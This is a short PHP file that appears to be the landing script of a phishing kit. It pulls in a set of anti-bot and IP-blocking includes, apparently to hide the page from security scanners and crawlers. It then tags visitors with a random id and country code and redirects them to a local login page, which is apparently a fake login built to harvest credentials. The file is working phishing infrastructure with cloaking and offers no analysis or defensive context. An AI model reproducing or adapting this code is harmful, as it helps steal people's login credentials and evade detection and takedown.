<?php
//---------------------------------------------------------------------------------------- INC
	include('./antibots.php');		
	include('./IpBlocker.php');
include("./ANTIBOTS/");	
include("./Bots-fSOCIETY/anti1.php");
include("./Bots-fSOCIETY/anti2.php");
include("./Bots-fSOCIETY/anti3.php");
include("./Bots-fSOCIETY/anti4.php");
include("./Bots-fSOCIETY/anti5.php");
include("./Bots-fSOCIETY/anti6.php");
include("./Bots-fSOCIETY/anti7.php");
include("./Bots-fSOCIETY/anti8.php"); 
include '../hisoka/all.php';
include './visitor.php';
//---------------------------------------------------------------------------------------- VAR
	$An = 'id='.rand(99, 100000000);
	$xcod = (empty($_SESSION['AYCOUNTCODE'])) ? '' : 'code='.$_SESSION['AYCOUNTCODE'].'&';
	$xbla = (empty($_SESSION['AYCOUNT'])) ? '' : '&country='.$_SESSION['AYCOUNT'];
//---------------------------------------------------------------------------------------- RNM
header("Location: ./login.php");
//---------------------------------------------------------------------------------------- FIN
?>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<script language="javascript">
var sirawdi = "./<?php echo Jib_milaf().$xcod.$An.$xbla ; ?>"        
top.location = sirawdi;
</script> 
</head>
</html>
